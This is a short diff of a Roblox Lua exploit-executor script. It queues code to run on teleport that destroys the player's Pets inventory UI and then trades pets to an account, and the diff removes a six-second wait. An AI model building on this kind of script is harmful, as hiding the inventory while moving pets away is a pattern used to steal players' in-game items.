@@ -964,7 +964,6 @@ queue_on_teleport([==[
 		game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Pets:Destroy()
 	end)
 	local IDs = {]==] .. IDs .. [==[}
-	wait(6)
         local hint = Instance.new('Hint', workspace)
 	hint.Text = '[3/4] Trading pets to account'
 
